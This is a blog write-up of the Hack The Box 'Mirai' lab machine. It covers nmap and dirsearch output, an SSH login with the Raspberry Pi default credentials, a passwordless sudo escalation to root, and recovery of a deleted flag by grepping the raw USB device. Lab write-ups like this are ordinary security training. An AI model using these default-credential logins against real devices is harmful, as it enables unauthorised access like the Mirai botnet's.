---
layout: post
title:  "HTB Mirai Machine Writeup"
date:   2020-1-2 00:10:00 +0000
categories: hackthebox
---
Cool box based off a cool concept that swept the earth.

# Nmap scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)
53/tcp open  domain  dnsmasq 2.76
| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp open  http    lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```
# Dirsearch results
```
[04:08:05] 200 -   61B  - /AccessPlatform/auth/clientscripts/cookies.js
[04:08:05] 200 -   61B  - /AccessPlatform/auth/clientscripts/login.js
[04:08:09] 301 -    0B  - /admin  ->  http://10.10.10.48/admin/
[04:08:10] 200 -   61B  - /admin.js
[04:09:11] 200 -   14KB - /admin/?/login
[04:09:11] 200 -   14KB - /admin/
[04:09:11] 200 -   14KB - /admin/index.php
[04:09:42] 200 -   61B  - /Brocfile.js
[04:09:42] 200 -   61B  - /brunch-config.js
[04:09:47] 200 -   61B  - /Citrix/AccessPlatform/auth/clientscripts/cookies.js
[04:09:48] 200 -   61B  - /Citrix/AccessPlatform/auth/clientscripts/login.js
[04:10:11] 200 -   61B  - /Gruntfile.js
[04:10:11] 200 -   61B  - /gulpfile.js
[04:10:33] 200 -   61B  - /mimosa-config.js
[04:11:10] 200 -   61B  - /swfobject.js
[04:11:20] 200 -   61B  - /v1/test/js/console_ajax.js
```

# Getting user
Mirai was a botnet that abused iot devices with default credentials. We can try this too since the webapp leaks what the box might be.
```
ssh pi@10.10.10.48 : raspberry (default)
```
We can get our user flag.

# Getting root
A sudo check shows us the first part to getting root.
```
pi@raspberrypi:~ $ sudo -l
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

Reading root.txt we get the following message.
```
“”root.txt"" = 'I lost my original root.txt! I think I may have a backup on my USB stick...'
```

We can use df to check system devices for external media.
```
We use the df command in unix to check system devices
/dev/sdb            8887      93      8078   2% /media/usbstick
mounted to /dev/sdb

root@raspberrypi:/media/usbstick# cat damnit.txt 
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
```
ahhhhhh more steps. Lets just grep out the filesystem for a flag.
```
grep -a -B 35 -A 120 'root' /dev/sdb
```
Finally we get our flag
